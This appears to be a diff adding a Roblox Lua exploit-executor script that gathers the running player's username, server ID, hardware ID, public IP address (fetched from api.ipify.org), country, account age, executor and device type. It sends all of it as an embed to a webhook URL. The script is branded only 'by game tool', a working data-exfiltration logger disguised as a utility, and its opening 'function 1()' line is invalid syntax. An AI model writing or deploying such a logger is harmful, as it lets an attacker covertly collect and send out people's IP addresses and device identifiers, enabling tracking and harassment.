@@ -1,0 +1,103 @@
+function 1()
+    
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+
+local function detectDevice()
+    if UserInputService.TouchEnabled then
+        if UserInputService:GetPlatform() == Enum.Platform.IOS then
+            return "iOS"
+        elseif UserInputService:GetPlatform() == Enum.Platform.Android then
+            return "Android"
+        else
+            return "Mobile (Unknown)"
+        end
+    elseif UserInputService.KeyboardEnabled then
+        return "PC"
+    else
+        return "Unknown"
+    end
+end
+
+local data = player:FindFirstChild("Data")
+if data then
+    local embedFields = {}
+
+    if _G.showPlayerName then
+        table.insert(embedFields, { name = "ᴀᴘᴘʟɪᴄᴀɴᴛ ɴᴀᴍᴇ", value = player.Name })
+    end
+
+    for _, child in ipairs(data:GetChildren()) do
+        if table.find(_G.targetNames, child.Name) and child:IsA("ValueBase") then
+            table.insert(embedFields, { name = child.Name, value = child.Value or 'ɴᴏ ᴅᴀᴛᴀ ᴀᴠᴀɪʟᴀʙʟᴇ' })
+        end
+    end
+
+    if _G.sendPlayerCount then
+        table.insert(embedFields, { name = "ᴘʟᴀʏᴇʀ ᴄᴏᴜɴᴛ ɪɴ sᴇʀᴠᴇʀ", value = Players.NumPlayers .. "/" .. Players.MaxPlayers })
+    end
+
+    if _G.sendMapLink then
+        table.insert(embedFields, { name = "ᴍᴀᴘ ʟɪɴᴋ", value = 'https://www.roblox.com/games/' .. game.PlaceId })
+    end
+
+    if _G.sendServerId then
+        table.insert(embedFields, { name = "sᴇʀᴠᴇʀ ɪᴅ", value = game.JobId })
+    end
+
+    if _G.sendHWID then
+        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+        table.insert(embedFields, { name = "ʜᴡɪᴅ", value = hwid })
+    end
+
+    if _G.sendIP then
+        local ip = game:HttpGet("https://api.ipify.org")
+        table.insert(embedFields, { name = "ɪᴘ ᴀᴅᴅʀᴇss", value = ip })
+    end
+
+    if _G.sendCountryFlag then
+        local api = game.HttpService:JSONDecode(game:HttpGet('https://ipwho.is/'))
+        local countryFlag = api.flag.emoji
+        local countryName = api.country
+        table.insert(embedFields, { name = "ᴄᴏᴜɴᴛʀʏ", value = countryFlag .. " " .. countryName })
+    end
+
+    if _G.sendAccountAge then
+        local accountCreationDate = player.AccountAge
+        table.insert(embedFields, { name = "ᴀᴄᴄᴏᴜɴᴛ ᴀɢᴇ", value = tostring(accountCreationDate) .. " ᴅᴀʏs" })
+    end
+
+    if _G.sendExecutorInfo and identifyexecutor then
+        local executorName, executorVersion = identifyexecutor()
+        table.insert(embedFields, { name = "ᴇxᴇᴄᴜᴛᴏʀ", value = executorName .. " (Version: " .. executorVersion .. ")" })
+    else
+        table.insert(embedFields, { name = "ᴇxᴇᴄᴜᴛᴏʀ", value = "ᴜɴᴀʙʟᴇ ᴛᴏ ᴅᴇᴛᴇᴄᴛ" })
+    end
+
+    if _G.sendDeviceInfo then
+        local deviceInfo = detectDevice()
+        table.insert(embedFields, { name = "ᴅᴇᴠɪᴄᴇ ɪɴғᴏ", value = deviceInfo })
+    end
+
+    local OSTime = os.time()
+    local Time = os.date('!*t', OSTime)
+    local Embed = {
+        title = 'ᴘʟᴀʏᴇʀ ɪɴғᴏʀᴍᴀᴛɪᴏɴ',
+        color = 99999,
+        footer = { text = 'by game tool' },
+        author = { name = '🎓', url = 'https://www.roblox.com/' },
+        fields = embedFields,
+        timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+    }
+
+    (syn and syn.request or http_request) {
+        Url = _G.webhookUrl,
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json',
+        },
+        Body = game:GetService'HttpService':JSONEncode({ embeds = { Embed } }),
+    }
+end
+end
